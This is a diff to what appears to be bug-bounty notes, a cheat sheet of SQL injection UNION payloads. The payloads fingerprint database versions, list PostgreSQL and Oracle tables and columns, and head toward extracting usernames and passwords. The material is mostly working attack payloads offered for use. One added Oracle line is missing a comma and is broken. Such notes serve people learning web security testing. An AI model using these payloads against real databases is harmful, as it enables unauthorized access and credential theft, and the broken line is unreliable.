@@ -16,13 +16,15 @@ This is all about web &amp; bugbounty
   ii) ' UNION SELECT @@version, NULL# (Microsoft ,MySql)
   iii)' UNION SELECT version(), NULL-- (postgresql)
   
-(4) Output the list of table names in the database (postgresql)
+(4) Output the list of table names in the database
 
-   i) ' UNION SELECT table_name, NULL FROM information_schema.tables--
+   i) ' UNION SELECT table_name, NULL FROM information_schema.tables--  (postgresql)
+   ii) ' UNION SELECT table_name NULL FROM all_tables-- (oracle)
  
-(5) Output the column names of the table (postgresql)
+(5) Output the column names of the table 
 
-    i) ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm'--
+    i) ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm'-- (postgresql)
+    ii) ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name= 'USERS_ABCDEF'-- (oracle)
     
 (6) Output the usernames and passwords
 
